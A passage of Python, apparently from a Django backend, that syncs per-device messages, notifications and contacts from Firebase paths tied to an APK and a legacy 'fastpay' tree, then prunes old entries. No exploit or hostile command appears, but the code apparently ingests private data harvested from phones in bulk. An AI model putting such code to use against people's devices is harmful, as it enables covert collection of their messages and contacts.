                ref.child(key).delete()
            logger.info(f"Cleaned Firebase contacts for device {device_id}: kept {keep_latest}, deleted {len(to_delete)}")
            return
        except Exception as e:
            logger.debug(f"Failed to clean contacts from {path}: {e}")
            continue
    logger.warning(f"Could not find contacts in Firebase for device {device_id}")


def sync_all_devices_from_firebase(keep_latest: int = 100) -> Dict[str, Any]:
    """
    Sync messages from Firebase to Django for all devices.
    After syncing, clean Firebase to keep only the latest N messages per device.
    
    Args:
        keep_latest: Number of latest messages to keep in Firebase per device (default: 100)
    
    Returns:
        Dictionary with overall sync results
    """
    from api.models import Device
    
    result = {
        'total_devices': 0,
        'devices_synced': 0,
        'devices_failed': 0,
        'total_messages_created': 0,
        'total_messages_skipped': 0,
        'device_results': [],
        'errors': []
    }
    
    try:
        # Get all devices
        devices = Device.objects.all()
        result['total_devices'] = devices.count()
        
        for device in devices:
            try:
                device_result = sync_messages_from_firebase(device.device_id, keep_latest=keep_latest)
                result['device_results'].append(device_result)
                
                if device_result['errors']:
                    result['devices_failed'] += 1
                else:
                    result['devices_synced'] += 1
                
                result['total_messages_created'] += device_result['messages_created']
                result['total_messages_skipped'] += device_result['messages_skipped']
                
            except Exception as e:
                result['devices_failed'] += 1
                result['errors'].append(f"Device {device.device_id}: {str(e)}")
                logger.error(f"Error syncing device {device.device_id}: {e}")
        
    except Exception as e:
        result['errors'].append(f"Sync all devices failed: {str(e)}")
        logger.error(f"Error syncing all devices: {e}")
    
    return result


def hard_sync_all_devices_from_firebase(update_existing: bool = True) -> Dict[str, Any]:
    """
    Hard sync: Sync all device data from Firebase to Django for all devices.
    
    Args:
        update_existing: If True, update existing records; if False, skip existing
    
    Returns:
        Dictionary with overall sync results
    """
    from api.models import Device
    
    result = {
        'total_devices_processed': 0,
        'devices_synced': 0,
        'devices_failed': 0,
        'total_messages_created': 0,
        'total_messages_updated': 0,
        'total_notifications_created': 0,
        'total_notifications_updated': 0,
        'total_contacts_created': 0,
        'total_contacts_updated': 0,
        'device_results': [],
        'errors': []
    }
    
    try:
        # Get all devices from Django
        django_devices = Device.objects.all()
        django_device_ids = set(django_devices.values_list('device_id', flat=True))
        
        # Also try to discover devices from Firebase
        try:
            initialize_firebase()
            firebase_device_ids = set()
            
            # Check device/{deviceId} path (primary, matches APK structure)
            device_ref = db.reference('device')
            device_data = device_ref.get()
            if device_data and isinstance(device_data, dict):
                firebase_device_ids.update(device_data.keys())
            
            # Check fastpay path (legacy)
            fastpay_ref = db.reference('fastpay')
            fastpay_data = fastpay_ref.get()
            if fastpay_data and isinstance(fastpay_data, dict):
                for key, value in fastpay_data.items():
                    if isinstance(value, dict) and ('messages' in value or 'Notification' in value or 'Contact' in value):
                        firebase_device_ids.add(key)
            
            # Add devices found in Firebase but not in Django
            if firebase_device_ids:
                all_device_ids = django_device_ids.union(firebase_device_ids)
            else:
                all_device_ids = django_device_ids
        except Exception as e:
            logger.warning(f"Could not discover devices from Firebase: {e}")
            all_device_ids = django_device_ids
        
        result['total_devices_processed'] = len(all_device_ids)
        
        for device_id in all_device_ids:
            try:
                device_result = hard_sync_device_from_firebase(device_id, update_existing=update_existing)
                result['device_results'].append(device_result)
                
                if device_result['errors']:
                    result['devices_failed'] += 1
                else:
                    result['devices_synced'] += 1
                
                result['total_messages_created'] += device_result['messages_created']
                result['total_messages_updated'] += device_result['messages_updated']
                result['total_notifications_created'] += device_result['notifications_created']
                result['total_notifications_updated'] += device_result['notifications_updated']
                result['total_contacts_created'] += device_result['contacts_created']
                result['total_contacts_updated'] += device_result['contacts_updated']
                
            except Exception as e:
                result['devices_failed'] += 1
                result['errors'].append(f"Device {device_id}: {str(e)}")
                logger.error(f"Error hard syncing device {device_id}: {e}")
        
    except Exception as e:
        result['errors'].append(f"Hard sync all devices failed: {str(e)}")
        logger.error(f"Error hard syncing all devices: {e}")
    
    return result
